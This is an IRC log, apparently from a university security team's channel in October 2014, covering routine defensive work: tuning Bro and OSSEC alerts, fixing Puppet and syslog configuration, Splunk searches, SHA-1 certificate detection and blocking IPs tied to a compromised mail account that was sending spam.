2014-10-16 13:50:07	jazoff	    Name: spice.ncsa.illinois.edu  Activated by mfelarca
2014-10-16 13:50:20	jazoff	other one is just
2014-10-16 13:50:21	jazoff	    Name: snuffy.ncsa.illinois.edu
2014-10-16 13:50:21	jazoff	    Name: 9.227.142.141.in-addr.arpa
2014-10-16 13:54:34	jazoff	as for other quetion...
2014-10-16 13:56:14	jazoff	i think most of what ossec/secops blocks is for ssh
2014-10-16 13:56:22	wraquel	I found the rule.
2014-10-16 13:56:35	wraquel	It's 6 failed login attempts in 120 seconds.
2014-10-16 13:56:52	wraquel	Not many other rules are tripped by ossec.
2014-10-16 13:57:04	jazoff	    block_why    | count
2014-10-16 13:57:05	jazoff	-----------------+-------
2014-10-16 13:57:05	jazoff	 OSSEC Rule 5712 |  1414
2014-10-16 13:57:08	jazoff	is that the one?
2014-10-16 13:57:13	wraquel	yep
2014-10-16 13:57:26	wraquel	Not sure if any, other than that one, blocks.
2014-10-16 13:57:34	jazoff	yeah that's the only one i see
2014-10-16 13:57:53	wraquel	the others are just notifications from ossec@tempest.ncsa.....
2014-10-16 13:58:04	jazoff	so, where I am working from today is like 2 blocks away from where pancakes works
2014-10-16 13:58:15	wraquel	really?
2014-10-16 13:58:22	jazoff	yeah, going to try to meet up at some point
2014-10-16 13:58:24	wraquel	Where are you?
2014-10-16 13:58:29	jazoff	union square in SF
2014-10-16 13:58:34	wraquel	sigh
2014-10-16 13:58:45	wraquel	did you get dim sum from Good Luck Dim Sum?
2014-10-16 13:58:46	jazoff	oh, you did not want to be me last few days
2014-10-16 13:58:51	wraquel	:D
2014-10-16 13:59:05	jazoff	city wide early packet pickup
2014-10-16 13:59:29	wraquel	The pier is a nice place to get a bowl of cioppino
2014-10-16 13:59:45	jazoff	yeah, my hotel is by there
2014-10-16 14:00:06	jazoff	so, city wide early packet pickup.. SF to sacramento to palo alto to danville in 4 days
2014-10-16 14:00:16	jazoff	back to back 18+ hour days
2014-10-16 14:00:22	wraquel	you're just off the historic trolley line, aren't you?
2014-10-16 14:01:20	wraquel	Fog City diner is a nice place if you want to hit a popular movie scene diner.
2014-10-16 14:02:50	jazoff	i'll see if I have time.. probably mostly large group dinners from here out
2014-10-16 14:09:15	jazoff	throwing tons of money at heroku seems to be working well so far
2014-10-16 14:10:05	jazoff	one neat thing we should be able to do with the new BHR api stuff is dynamic whitelist management as well as blacklist
2014-10-16 14:10:21	jazoff	so if an IP makes a large number of successful ssh connections over a time period, auto whitelist it
2014-10-16 14:10:26	wraquel	clicking on 'full gulp info' in ninfo hits a 404
2014-10-16 14:10:27	ncsabot	Error running plugin
2014-10-16 14:10:37	jazoff	oh? it should just link to splunk
2014-10-16 14:10:50	jazoff	basically a search for index=gulp <whatever you searched for>
2014-10-16 14:10:54	wraquel	ah
2014-10-16 14:11:45	jazoff	so I have a nice out of the way place to work, but I did not count on the extremely loud sound system here
2014-10-16 14:11:50	jazoff	so joining the bro conf call might be tricky
2014-10-16 14:12:12	wraquel	You should look into noise cancelling headphones.
2014-10-16 14:12:13	wraquel	:D
2014-10-16 14:12:16	jazoff	yeah
2014-10-16 14:12:17	jazoff	so
2014-10-16 14:12:21	jazoff	i reproduced that error
2014-10-16 14:12:21	jazoff	odd
2014-10-16 14:12:34	jazoff	oh, yeah, it's my deafult
2014-10-16 14:12:36	jazoff	feault
2014-10-16 14:12:41	wraquel	lol
2014-10-16 14:12:44	jazoff	should be just /search/ not /security/
2014-10-16 14:15:37	jazoff	fixed
2014-10-16 14:16:00	jazoff	oh, bounce server would help
2014-10-16 15:03:47	wraquel	So....
2014-10-16 15:04:06	wraquel	on the 25th all SQL injection bro alert emails went silent.
2014-10-16 15:04:31	jazoff	hmm
2014-10-16 15:04:37	jazoff	of sep?
2014-10-16 15:04:45	wraquel	y
2014-10-16 15:08:43	wraquel	And... is there a way to digest the bash alerts. :)
2014-10-16 15:08:52	wraquel	They're coming in at like 1 a minute
2014-10-16 15:09:13	wraquel	oh. there's a sql injection one from today...
2014-10-16 15:09:14	wraquel	weird.
2014-10-16 15:09:21	wraquel	Must be because it's getting lost int he bash noice.
2014-10-16 15:09:25	wraquel	noise
2014-10-16 15:10:37	jazoff	ah yeah
2014-10-16 15:10:50	jazoff	i was going ot say, there were changes around that date, but to enable the bash stuff
2014-10-16 15:10:53	jazoff	I can turn off the bash emails
2014-10-16 15:11:01	wraquel	Hmm.
2014-10-16 15:11:02	jazoff	(and they will still be bhrd)
2014-10-16 15:11:15	wraquel	Just thinking that it would be nice for bro to have a digest option in general
2014-10-16 15:11:34	wraquel	turning off emails should be acceptable.
2014-10-16 15:12:11	jazoff	yeah, it has one... the alarm summary email
2014-10-16 15:30:03	jazoff	ok, bro should update soon and no longer email the shellshock attempts
2014-10-16 15:39:17	jazoff	oooor not
2014-10-16 15:39:25	jazoff	PUPPET Y U BROKE
2014-10-16 15:39:33	jazoff	Oct 16 15:39:02 supercell puppet-agent[22515]: Unable to fetch my node definition, but the agent run will continue:
2014-10-16 15:39:36	jazoff	Oct 16 15:39:02 supercell puppet-agent[22515]: SSL_CTX_use_PrivateKey:: key values mismatch
2014-10-16 15:42:18	jazoff	fixed i think, on supercell at least
2014-10-16 16:12:29	jazoff	sooo supercell cluster seems broken
2014-10-16 16:13:17	jazoff	still logging but ssh is broke
2014-10-16 16:13:52	jazoff	[root@supercell ~]# ssh  10.142.148.24
2014-10-16 16:13:53	jazoff	ssh: connect to host 10.142.148.24 port 22: Connection timed out
2014-10-16 16:15:17	jazoff	nagios does not seem to be monitoring that
2014-10-16 16:20:51	jazoff	oh, odd. can connect from fog
2014-10-16 16:22:56	jazoff	ah, they were moved in puppet too and lost their role
2014-10-16 16:31:47	jschipp	jazoff: make sure they didn't get my SSH ACL's
2014-10-16 16:41:43	jazoff	i think its fine
2014-10-16 16:41:48	jazoff	just had to reapply bro worker role
2014-10-16 16:42:14	wraquel	weird.
2014-10-16 16:42:33	jazoff	same squall -> puppet-sec issue from the other day
2014-10-16 16:42:34	wraquel	you saw this right? error: cannot acquire lock: [Errno 13] Permission denied: '/usr/local/bro-2.3/spool/lock.22527'
2014-10-16 16:42:38	jazoff	yeah
2014-10-16 16:42:40	wraquel	that was at 4:26
2014-10-16 16:42:42	wraquel	k
2014-10-16 16:42:49	jazoff	it's all better now
2014-10-16 16:43:02	jazoff	ssh broken causes broctl to hang and block which causes it to get locked up
2014-10-17 09:48:04	wraquel	daily topn emails look... funky.
2014-10-17 09:48:08	wraquel	python errors, blank.
2014-10-17 09:48:32	wraquel	ha
2014-10-17 09:48:32	wraquel	ah
2014-10-17 09:48:38	wraquel	 certificate error warning.
2014-10-17 09:48:54	wraquel	/home/secops/tt_report/python_env/lib/python2.6/site-packages/requests/packages/urllib3/connectionpool.py:730: InsecureRequestWarning: Unverified HTTPS request is being made.
2014-10-17 09:49:14	wraquel	But the previous email is still blank.
2014-10-17 11:01:42	jazoff	hmmm
2014-10-17 11:03:21	jazoff	that's just a warning
2014-10-17 11:03:40	jazoff	it works when i run the script from the cli
2014-10-17 11:09:15	wraquel	yeah.
2014-10-17 11:09:25	wraquel	What's the alert for plaintext http auth?
2014-10-17 11:09:36	wraquel	Are those emailed or just in notice?
2014-10-17 11:09:47	wraquel	Or is it still on?
2014-10-17 11:22:40	jazoff	hmm
2014-10-17 11:23:02	jazoff	i think just in notice log
2014-10-17 11:24:19	jazoff	ninfo bro_notice 141.142.227.68
2014-10-17 11:24:22	ncsabot	Time: 2014-10-17 10:05:32.691 CDT
2014-10-17 11:24:22	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:23	ncsabot	SRC IP: 59.173.13.72
2014-10-17 11:24:23	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:23	ncsabot	MSG: Intel hit on 59.173.13.72 at Conn::IN_ORIG  
2014-10-17 11:24:23	ncsabot	SUB: 59.173.13.72  
2014-10-17 11:24:23	ncsabot	Time: 2014-10-17 08:37:15.708 CDT
2014-10-17 11:24:23	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:23	ncsabot	SRC IP: 122.225.109.105
2014-10-17 11:24:23	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:23	ncsabot	MSG: Intel hit on 122.225.109.105 at Conn::IN_ORIG  
2014-10-17 11:24:23	ncsabot	SUB: 122.225.109.105  
2014-10-17 11:24:24	ncsabot	Time: 2014-10-17 05:32:45.885 CDT
2014-10-17 11:24:25	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:26	ncsabot	SRC IP: 117.27.158.104
2014-10-17 11:24:27	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:28	jazoff	doh
2014-10-17 11:24:28	ncsabot	MSG: Intel hit on 117.27.158.104 at Conn::IN_ORIG  
2014-10-17 11:24:29	ncsabot	SUB: 117.27.158.104  
2014-10-17 11:24:30	ncsabot	Time: 2014-10-17 02:39:24.392 CDT
2014-10-17 11:24:31	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:32	ncsabot	SRC IP: 218.2.0.123
2014-10-17 11:24:33	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:34	ncsabot	MSG: Intel hit on 218.2.0.123 at Conn::IN_ORIG  
2014-10-17 11:24:35	ncsabot	SUB: 218.2.0.123  
2014-10-17 11:24:36	ncsabot	Time: 2014-10-16 22:53:13.246 CDT
2014-10-17 11:24:38	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:39	ncsabot	SRC IP: 122.225.97.100
2014-10-17 11:24:40	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:41	ncsabot	MSG: Intel hit on 122.225.97.100 at Conn::IN_ORIG  
2014-10-17 11:24:42	ncsabot	SUB: 122.225.97.100  
2014-10-17 11:24:43	ncsabot	Time: 2014-10-16 18:53:56.542 CDT
2014-10-17 11:24:44	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:45	ncsabot	SRC IP: 122.225.109.200
2014-10-17 11:24:46	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:47	ncsabot	MSG: Intel hit on 122.225.109.200 at Conn::IN_ORIG  
2014-10-17 11:24:47	wraquel	omg
2014-10-17 11:24:48	ncsabot	SUB: 122.225.109.200  
2014-10-17 11:24:49	ncsabot	Time: 2014-10-16 15:03:43.430 CDT
2014-10-17 11:24:50	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:51	ncsabot	SRC IP: 218.2.0.129
2014-10-17 11:24:52	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:52	jazoff	nooot what I was expecting
2014-10-17 11:24:53	ncsabot	MSG: Intel hit on 218.2.0.129 at Conn::IN_ORIG  
2014-10-17 11:24:54	ncsabot	SUB: 218.2.0.129  
2014-10-17 11:24:55	ncsabot	Time: 2014-10-16 07:02:54.707 CDT
2014-10-17 11:24:56	ncsabot	Notice: Intel::Notice
2014-10-17 11:24:57	ncsabot	SRC IP: 118.123.213.82
2014-10-17 11:24:58	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:24:59	ncsabot	MSG: Intel hit on 118.123.213.82 at Conn::IN_ORIG  
2014-10-17 11:25:00	ncsabot	SUB: 118.123.213.82  
2014-10-17 11:25:01	ncsabot	Time: 2014-10-16 05:51:27.594 CDT
2014-10-17 11:25:02	ncsabot	Notice: Intel::Notice
2014-10-17 11:25:03	ncsabot	SRC IP: 219.153.51.47
2014-10-17 11:25:04	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:25:05	ncsabot	MSG: Intel hit on 219.153.51.47 at Conn::IN_ORIG  
2014-10-17 11:25:06	ncsabot	SUB: 219.153.51.47  
2014-10-17 11:25:07	ncsabot	Time: 2014-10-16 01:28:08.773 CDT
2014-10-17 11:25:08	ncsabot	Notice: Intel::Notice
2014-10-17 11:25:09	ncsabot	SRC IP: 218.2.0.133
2014-10-17 11:25:10	ncsabot	DST IP: 141.142.227.68
2014-10-17 11:25:10	wraquel	ncsabot: shut up
2014-10-17 11:25:11	ncsabot	MSG: Intel hit on 218.2.0.133 at Conn::IN_ORIG  
2014-10-17 11:25:12	ncsabot	SUB: 218.2.0.133  
2014-10-17 11:25:13	ncsabot	Time: 2014-10-15 21:51:06.699 CDT
2014-10-17 11:25:14	ncsabot	Notice: Intel::Notice
2014-10-17 11:25:14	jazoff	ncsabot: die
2014-10-17 11:25:14	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Input/output error)
2014-10-17 11:25:24	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-10-17 11:25:38	wraquel	good to know
2014-10-17 11:25:47	jazoff	note to self, fix the bro notice plugin template to be a one line output
2014-10-17 11:26:14	jazoff	but anyway, yeah, it's just a noice, you can see them in splunk if you search for Basic_Auth_Server
2014-10-17 11:26:49	jazoff	I did have it enabled briefly, but there was wayyyy too much email
2014-10-17 11:27:34	wraquel	yeah... Looking at the 7 day graph right now...
2014-10-17 11:28:32	wraquel	oh yay. username admin
2014-10-17 11:28:54	wraquel	hmmm. anyway to have that notice include the url?
2014-10-17 11:29:48	jazoff	hmm. probably
2014-10-17 11:30:12	jazoff	yeah, can do that
2014-10-17 11:30:24	jazoff	can make the sub field the full url
2014-10-17 11:30:28	jazoff	including the username
2014-10-17 11:32:28	wraquel	username: admin65.96.25.198141.142.176.380
2014-10-17 11:32:46	wraquel	yay for copy and paste... not
2014-10-17 11:32:54	wraquel	those are perfonar box3n
2014-10-17 11:33:04	wraquel	141.142.176.3 and .2
2014-10-17 11:33:11	wraquel	someone is logging in as 'admin'
2014-10-17 11:33:13	wraquel	from off-campus
2014-10-17 11:35:18	wraquel	hmmm
2014-10-17 11:35:27	wraquel	actually, I can't tell if these alerts are successful
2014-10-17 11:37:11	jazoff	yeah, a lot of those are likely scans
2014-10-17 11:37:38	jazoff	that was the reason I turned off the eamil
2014-10-17 11:37:51	wraquel	yeah, that remote host is a bad actor.
2014-10-17 11:38:21	wraquel	good ol comcast address.
2014-10-17 11:40:21	jazoff	Mozilla/4.0 (compatible; MSIE 6.0; Win32) WebWasher 3.0
2014-10-17 11:40:23	jazoff	was the user-agent
2014-10-17 12:43:59	jschipp	I stayed up way too late last night :/
2014-10-17 12:44:47	jschipp	but it was worth it because ISLET now uses SQLite 
2014-10-17 12:53:50	jazoff	heh, that idea sounds familar :)
2014-10-17 13:30:21	wraquel	what was that nagios alert about?
2014-10-17 13:31:59	jschipp	wraquel: what alert?
2014-10-17 13:32:30	wraquel	Well, it recovered. Said the cert for ops-security.xsede.org was invalid.
2014-10-17 13:33:06	jschipp	did you recieve an SMS?
2014-10-17 13:33:09	wraquel	yeah
2014-10-17 13:33:13	jschipp	hmm, I didn't
2014-10-17 13:33:22	jschipp	at what time?
2014-10-17 13:33:40	wraquel	actually no. it was an email
2014-10-17 13:34:08	wraquel	weird.
2014-10-17 13:34:29	wraquel	It's on my phone as an email
2014-10-17 13:34:30	wraquel	oh
2014-10-17 13:34:33	wraquel	Nevermind.
2014-10-17 13:34:38	wraquel	It was an XSEDE alert.
2014-10-17 13:34:47	wraquel	From their nagios server at IU.
2014-10-17 13:34:51	wraquel	I thought it looked weird.
2014-10-17 13:53:49	jschipp	lol, kk
2014-10-17 13:59:43	 *	jschipp is going for a walk
2014-10-17 16:11:23	wraquel	Can bro tell us if certificate chains for SSL services are SHA1 signed anywhere in the chain?
2014-10-20 09:23:02	 *	jazoff yawns
2014-10-20 09:23:53	 *	wraquel passes digital coffee
2014-10-20 09:29:43	jazoff	:)
2014-10-20 09:31:28	jazoff	long day yesterday
2014-10-20 09:31:38	jazoff	flying back to atl in a few hours
2014-10-20 09:31:46	wraquel	Ahh.
2014-10-20 09:31:49	jazoff	did get to meet up with pancakes the other day
2014-10-20 09:31:56	wraquel	yeah, how's he?
2014-10-20 09:32:04	jazoff	great
2014-10-20 09:32:09	jazoff	CL seems like an awesome place
2014-10-20 09:32:17	wraquel	CL?
2014-10-20 09:32:19	jazoff	craigslist
2014-10-20 09:32:22	wraquel	ah right
2014-10-20 09:33:34	wraquel	Wasn't he there in Atlanta before?
2014-10-20 09:35:38	jazoff	not that I know of, i think he went right to sf
2014-10-20 09:35:55	wraquel	Oh right, different person. Chris Green just moved over there.
2014-10-20 09:38:09	jazoff	ah yeah, to splunk
2014-10-20 09:38:20	wraquel	yup.
2014-10-20 09:41:31	jazoff	wanted to get over to berkeley one day but never had time
2014-10-20 09:42:12	wraquel	You ARE working remotely you know... Just have spent the week out there in a tent or something. :)
2014-10-20 09:43:38	jazoff	yeah, got some work done a bunch of days, not as much as I would have liked
2014-10-20 09:43:47	jazoff	will put half the days down as half days in the VSL thing
2014-10-20 09:44:01	jazoff	rumors of the "down time" I was to have had were slightly exaggerated 
2014-10-20 09:48:29	jazoff	unfortunately we did a good job so we probably will get to do it again :)
2014-10-20 09:48:48	wraquel	charge double next time
2014-10-20 09:48:59	jazoff	hah
2014-10-20 10:08:08	wraquel	Not sure if you answered this or not jazoff, can the bro ssl analyzer check if the certificate chain for a system is sha1/2 signed? Not just the server's cert, but including any provided chain certs?
2014-10-20 10:10:46	jazoff	hmm, I think you have access to the chain
2014-10-20 10:12:27	jazoff	there is this: https://github.com/0xxon/bro-scripts/blob/master/chrome-sha1.bro
2014-10-20 10:13:13	jazoff	i think that is related to your question :)
2014-10-20 10:13:59	wraquel	ooh, nice
2014-10-20 10:14:09	wraquel	want to test it out?
2014-10-20 10:14:13	jazoff	sure
2014-10-20 10:14:42	wraquel	lol. leave it to johanna.
2014-10-20 10:14:52	jazoff	:)
2014-10-20 10:16:55	jazoff	derp, merged it into the production env instead of develpment
2014-10-20 10:17:00	jazoff	well, coming to a production cluster near you :)
2014-10-20 10:17:12	wraquel	Hmm.
2014-10-20 10:17:19	wraquel	which log will it show up in?
2014-10-20 10:17:24	jazoff	notice.log
2014-10-20 10:17:32	wraquel	I'll keep an eye out.
2014-10-20 10:17:37	wraquel	and there goes ncsabot
2014-10-20 10:17:37	jazoff	Chrome::SHA1_Sunset
2014-10-20 10:17:58	wraquel	ncsabot says development.
2014-10-20 10:18:06	jazoff	i did both
2014-10-20 10:18:09	wraquel	ah
2014-10-20 10:18:11	jazoff	after I did prod the first time
2014-10-20 10:18:14	jazoff	also, the excessive-crl will be in prod soon
2014-10-20 10:18:30	jazoff	might have to turn it off, it will likely send a lot of emails
2014-10-20 10:19:34	jazoff	did the syslog config change recently?
2014-10-20 10:19:48	eyrich	im not sure we need the excessive crl in bro now. I have a nice alert working in splunk
2014-10-20 10:19:52	jazoff	i notice that /var/log/messages is all on one line now and newlines don't show up
2014-10-20 10:19:57	jazoff	ok, works for me
2014-10-20 10:20:19	jazoff	i can leave it enabled so we can search in notice.log but will turn off the emails for it
2014-10-20 10:20:26	eyrich	ok
2014-10-20 10:20:47	wraquel	know any good openssl libraries for python that parse certificates decently?
2014-10-20 10:21:27	jazoff	never really looked
2014-10-20 10:23:02	wraquel	hmmm. I think I did it once via asn..
2014-10-20 10:34:49	jazoff	lots of sha1 alerts
2014-10-20 10:42:46	wraquel	yeah, but so far for only 28 services.
2014-10-20 10:47:30	wraquel	hope I did that right. https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/sha-1_sunset_hosts
2014-10-20 10:50:50	jazoff	"Chrome::SHA1_Sunset" | top id_orig_h id_resp_h sub
2014-10-20 10:50:51	jazoff	works too
2014-10-20 10:51:08	jazoff	"Chrome::SHA1_Sunset" | top id_orig_h id_resp_h sub | table id_orig_h id_resp_h count percent sub
2014-10-20 10:51:11	jazoff	to reorder the output
2014-10-20 10:52:55	wraquel	I wanted to have the time last seen included
2014-10-20 10:53:27	jazoff	oh
2014-10-20 10:53:33	jazoff	yeah that complicates things :)
2014-10-20 10:53:38	wraquel	:D
2014-10-20 10:58:23	wraquel	uh... shoot.
2014-10-20 10:58:29	wraquel	Now time is showing in decimal...
2014-10-20 10:59:18	jazoff	ah, you can convert it
2014-10-20 10:59:40	wraquel	what's the fu for that?
2014-10-20 10:59:55	wraquel	It was fine before I renamed the column.
2014-10-20 11:01:23	jazoff	convert ctime(_time)
2014-10-20 11:01:25	jazoff	try that
2014-10-20 11:01:31	jazoff	or whatever the time field is
2014-10-20 11:02:24	wraquel	hmmm. how do I do that after a rename?
2014-10-20 11:02:38	wraquel	oh, duh
2014-10-20 11:02:51	wraquel	Annnnd done
2014-10-20 15:11:11	jschipp	anyone know why the polo rsyslog config is set to accept UDP messages but not TCP? is that intentional?
2014-10-20 15:15:52	eyrich	for the tomcat stuff maybe? locally sending UDP messages from one service to rsyslog?
2014-10-20 15:23:59	jschipp	from there it forwards to syslog-sec. seems like an awkward way of doing it unless the unix domain socket can't be used for some reason
2014-10-20 15:34:04	eyrich	i would guess it is something that can not send tcp, so using the local one was relay. Sam/Terry would be best to answer
2014-10-21 11:02:56	jazoff	quiet day :)
2014-10-21 11:03:24	jazoff	jschipp: did you fix something with the syslog? I don't see the lack of newlines problem anymore
2014-10-21 11:05:51	wraquel	Looks like he did a few rsyslog commits yesterday
2014-10-21 11:07:11	jazoff	yeah, maybe this was the thing
2014-10-21 11:07:12	jazoff	-$ActionFileDefaultTemplate RSYSLOG_ForwardFormat
2014-10-21 11:07:12	jazoff	+$ActionFileDefaultTemplate RSYSLOG_FileFormat
2014-10-21 11:36:19	jschipp	yeah, I misread the documentatation
2014-10-21 11:37:58	jazoff	no problem :)
2014-10-21 13:09:13	wraquel	What's up with cyclone's space usage?
2014-10-21 13:09:44	jazoff	hmm?
2014-10-21 13:09:59	wraquel	monit alert for cyclone
2014-10-21 13:10:02	wraquel	tmp is at 100%
2014-10-21 13:10:22	jazoff	seems ok
2014-10-21 13:10:23	jazoff	lemme see
2014-10-21 13:12:56	jazoff	cyclone? /tmp is not full
2014-10-21 13:17:47	wraquel	must be emptying out
2014-10-21 13:18:55	wraquel	is munin-sec.internal.ncsa.edu down? or moved?
2014-10-21 13:25:49	jschipp	wraquel: that was my file, I had a pcap in /tmp. Fixed it an hour or so ago
2014-10-21 13:26:00	jschipp	^on cyclone
2014-10-21 13:27:35	jschipp	s/file/fault
2014-10-21 13:35:32	wraquel	k
2014-10-21 13:35:46	wraquel	waht's up with munin? Still up?
2014-10-21 13:40:21	jschipp	what's the nfsen url now?
2014-10-21 13:40:30	wraquel	netflow-sec
2014-10-21 13:40:59	wraquel	er..
2014-10-21 13:41:02	wraquel	I thought it was...
2014-10-21 13:41:18	jschipp	flows-sec but /nfsen doens't work
2014-10-21 13:41:26	jschipp	jazoff: 
2014-10-21 13:42:02	wraquel	flows-sec.internal.ncsa.edu/nfsen/index.php
2014-10-21 13:43:00	wraquel	That big spike is Qualys
2014-10-21 13:43:41	jschipp	ah, internal domain
2014-10-21 13:43:43	jschipp	thx
2014-10-21 13:45:25	jschipp	vmtoolsd is working the cpu pretty hard on fog
2014-10-21 14:03:41	jazoff	munin lost it's puppet role
2014-10-21 14:03:43	jazoff	i think i fixed it...
2014-10-21 14:04:13	jschipp	wow,  ps -e -o command,bsdtime | awk '/vmtoolsd/ && NR == 84 { printf("%d days\n", $2/60/24) }'
2014-10-21 14:04:16	jschipp	9 days
2014-10-21 14:33:57	jazoff	munin fixed
2014-10-21 14:34:20	jazoff	http://munin-sec.internal.ncsa.edu/munin/log/cyclone.ncsa.illinois.edu/df.html
2014-10-21 14:34:25	jazoff	i see.. there was a /tmp disk space problem
2014-10-21 14:48:16	 *	jschipp is going for a walk
2014-10-22 10:18:42	wraquel	jazoff: have you started working on the CA stuff yet?
2014-10-22 10:23:27	jazoff	no
2014-10-22 10:23:32	jazoff	finishing up on the BHR project
2014-10-22 10:23:40	jazoff	have been thinking about the CA thing though
2014-10-22 10:23:56	jazoff	need to read over the use cases a few more times
2014-10-22 10:41:21	wraquel	jazoff: have you started working on the CA stuff yet?
2014-10-22 10:41:23	wraquel	sooh
2014-10-22 10:41:25	wraquel	shoot
2014-10-22 10:41:32	wraquel	didn't mean to resend that q
2014-10-22 10:41:39	jazoff	:)
2014-10-22 11:13:38	jazoff	ugh, iterm2 crashed and took every terminal window with it
2014-10-22 11:43:58	jazoff	so, the mail servers don't do any sort of user rate limiting? fun
2014-10-22 11:50:35	jazoff	ok, apparently we are sorely needing some smtp bro policies
2014-10-22 11:54:12	jschipp	:)
2014-10-22 12:05:29	jschipp	ossec had an alert, "Multiple rejected e-mails from same source ip." all .jp addresses
2014-10-22 12:09:48	jazoff	related to jeffc?
2014-10-22 12:13:00	jschipp	I'm just assuming
2014-10-22 12:14:06	jazoff	ok, wrote a script for detecting spam
2014-10-22 12:33:16	wraquel	Just got back, what's up with jeffc? Is that his NCSA account or campus account?
2014-10-22 12:45:53	jazoff	good question
2014-10-22 12:56:34	jazoff	wraquel: looks like they need to flush the queue on the mail server for messages from jeffc
2014-10-22 13:09:51	jazoff	also.. not sure if there is anywhere in the syslogs that we get that will show a SMTP login from jeffc
2014-10-22 13:09:57	jazoff	if there is, it's burried
2014-10-22 13:10:17	jazoff	there are lots of ips listed, but many of those are other servers and I don't see one that is obviously the client ip
2014-10-22 13:16:12	wraquel	Yeah, I don't see those either.
2014-10-22 13:17:12	jazoff	now that the password has been changed I see lots of failures, but nothing that includes the IP
2014-10-22 13:17:25	jazoff	I hate software :(
2014-10-22 13:17:53	jazoff	I forgot we did email locally.. finding shit like this is why I originally ran bro at UA
2014-10-22 13:18:00	jazoff	the email admins had their heads in the sand
2014-10-22 13:18:28	jazoff	just about got the bro scritp working
2014-10-22 13:18:32	wraquel	Yeah, kerb is sort of stupid that way. We can get kerb failures, but that's only the auth endpoint, not the source of where those attempts are.
2014-10-22 13:19:29	wraquel	lots of 'sender <jeffc@ncsa.uiuc.edu> SMTP AUTH authenticated'.
2014-10-22 13:19:37	wraquel	Sigh. I think it may have it on a differnt log line.
2014-10-22 13:19:55	wraquel	yep
2014-10-22 13:20:11	jazoff	splunk has a transaction filter that can help with that
2014-10-22 13:20:19	jazoff	though i bet the lines dont have a transaction id in them
2014-10-22 13:20:26	wraquel	They do
2014-10-22 13:20:28	wraquel	look at s9MHDaPa009934
2014-10-22 13:20:41	wraquel	oct 22, 12:19
2014-10-22 13:20:49	wraquel	So you're not sitting on a search...
2014-10-22 13:21:26	jazoff	ah
2014-10-22 13:21:26	wraquel	one thing I hate about sendmail log forensics...
2014-10-22 13:21:37	jazoff	yeah, that's why the bro logs are nice
2014-10-22 13:21:45	jazoff	if that had a txid=s9MHDaPa009934 it would be easy
2014-10-22 13:22:07	jazoff	search ... | transaction txid
2014-10-22 13:22:53	wraquel	wait, is that in there?
2014-10-22 13:23:03	jazoff	no, you need to tell it how to do it first
2014-10-22 13:23:21	jazoff	unless you mean the s9MHDaPa009934, which is there
2014-10-22 13:23:24	wraquel	bummer. Hopefully you're doing that now?
2014-10-22 13:23:31	wraquel	Well, no, that was just a test.
2014-10-22 13:23:48	jazoff	from=<jeffc@ncsa.uiuc.edu>, size=873, class=0, nrcpts=8, msgid=<201410221718.s9MHDaPA009934@rimantadine.ncsa.uiuc.edu>, proto=ESMTP, daemon=TLSMTA, relay=[188.0.109.139]
2014-10-22 13:23:56	jazoff	is the relay ip the client ip or the next server ip?
2014-10-22 13:24:19	wraquel	I think it's where the request is coming from.
2014-10-22 13:24:21	wraquel	Not the next hop
2014-10-22 13:24:41	jazoff	cause there is the other log format it uses where that is what relay is
2014-10-22 13:25:01	wraquel	yeah, relay is the host that sent the mail
2014-10-22 13:27:59	jazoff	a search for 'sendmail jeffc  TLSMTA'
2014-10-22 13:28:02	jazoff	filters through the crap
2014-10-22 13:28:59	jazoff	sendmail jeffc  TLSMTA | erex srcip examples="37.215.57.148" | top limit=100 srcip
2014-10-22 13:30:21	jazoff	going to BHR those ips
2014-10-22 13:32:01	wraquel	That's a lot of IPs.
2014-10-22 13:34:53	jazoff	ok, blocked for a year
2014-10-22 13:36:01	jazoff	looks like the alert works
2014-10-22 13:36:03	jazoff	SMTP::ExcessiveRecipients<jeffc@ncsa.uiuc.edu> has sent mail to more than 5 recipients in 1.0 hr
2014-10-22 13:36:12	wraquel	nice
2014-10-22 13:36:14	jazoff	(sendmail is still trying to send messages from the queue)
2014-10-22 13:36:21	jazoff	i set the limit to 5 to test
2014-10-22 13:39:48	jazoff	deploying to dev and prod
2014-10-22 13:39:52	jazoff	it should work :)
2014-10-22 13:41:08	jazoff	it will likely alert on mailing lists and alerting systems, but i will add them to a whitelist
2014-10-22 13:41:21	jazoff	at UA I think we had like 10 addresses that legitimately mailed lots of people
2014-10-22 13:41:41	jazoff	(which was why it was crazy that any student could email 10k addresses)
2014-10-22 13:49:17	jazoff	wraquel: i'm not 100% sure we are getting the most helpful logs from sendmail
2014-10-22 13:49:30	jazoff	if a remote ip authenticates and then disconnects without sending any mail, what shows up?
2014-10-22 13:54:14	eyrich	jazoff: is the dev cluser getting fully copy?
2014-10-22 13:54:29	jazoff	it should be...
2014-10-22 13:54:50	eyrich	im speccing the new production cluster
2014-10-22 13:54:58	jazoff	ah
2014-10-22 13:55:01	eyrich	they will have 2x 8 core xeons
2014-10-22 13:55:03	eyrich	how much ram
2014-10-22 13:55:03	eyrich	?
2014-10-22 13:55:14	eyrich	these have to last 4 years
2014-10-22 13:55:27	jazoff	dev cluster nodes are currenty using 18G each
2014-10-22 13:55:38	eyrich	and they have like 64?
2014-10-22 13:56:36	jazoff	96
2014-10-22 13:56:41	jazoff	though it's two NUMA nodes that have 48 each
2014-10-22 13:57:17	eyrich	ok, what are your thoughts pn the new boxes? every dime we dont spend on them gets put towards bulk sotrage
2014-10-22 13:57:20	eyrich	storage
2014-10-22 13:57:50	jazoff	I generally increase the specs until it stops being economical to do so
2014-10-22 13:58:08	jazoff	if 128G of ram is only a few more K might as well do it
2014-10-22 13:58:16	jazoff	unless it's like 2x the price
